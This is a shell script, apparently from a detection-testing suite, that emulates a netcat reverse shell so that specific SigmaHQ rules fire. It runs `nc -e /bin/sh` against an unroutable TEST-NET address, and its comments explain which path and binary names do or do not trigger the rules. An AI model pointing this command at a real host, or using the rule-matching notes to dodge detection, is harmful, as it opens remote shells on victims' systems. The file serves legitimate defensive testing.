#!/usr/bin/env bash
# sigmahq_netcat_reverse_shell.sh - benign SigmaHQ emulation (see sigmahq_nohup.sh header).
#
# What an attacker does: a netcat reverse/bind shell (T1059), e.g.
# `nc -e /bin/sh <c2> 4444`, so a connecting attacker gets a shell. Harmless
# analogue: the same `nc -e /bin/sh` shape pointed at a TEST-NET-1 address
# (192.0.2.1, RFC 5737, guaranteed unroutable) with a 1s timeout, so the connect
# never succeeds and the shell is therefore never exec'd.
#
# Naming note: the netcat_reverse_shell rule matches an image ending '/nc' or
# '/ncat' only, but nixpkgs ships the GNU netcat binary as 'netcat' with 'nc' a
# symlink, so a plain `nc` run resolves (auditd 'exe=') to '.../netcat' and only
# susp_network_utilities_execution (which also lists '/netcat') would fire. So we
# copy the resolved netcat binary to a scratch file literally named 'nc' in HOME
# (NOT /tmp or /dev/shm, to avoid the tmp-exec rules) and run that: the execve's
# image ends '/nc' and carries ' -e ' and '/bin/sh', which netcat_reverse_shell
# keys on. susp_network_utilities_execution (any nc without a listen flag)
# genuinely fires alongside - a legit twin.
#
# Imitates (SigmaHQ): proc_creation_lnx_netcat_reverse_shell.yml - ATT&CK T1059
# Expected rules: proc_creation_lnx_netcat_reverse_shell,
#                 proc_creation_lnx_susp_network_utilities_execution
set -u

ncpath="$(type -P nc)"
[ -n "$ncpath" ] || { echo "BANKEN-EMUL-SKIP: no nc"; exit 0; }
real="$(readlink -f "$ncpath" 2>/dev/null || echo "$ncpath")"

d="${HOME:-/home/alice}/.bk-emul-nc.$$"
mkdir -p "$d" 2>/dev/null || { echo "BANKEN-EMUL-SKIP: cannot create scratch dir"; exit 0; }
cp "$real" "$d/nc" 2>/dev/null || { echo "BANKEN-EMUL-SKIP: cannot stage nc"; exit 0; }
"$d/nc" -w 1 -e /bin/sh 192.0.2.1 4444 >/dev/null 2>&1 || true
rm -rf "$d" 2>/dev/null || true

exit 0
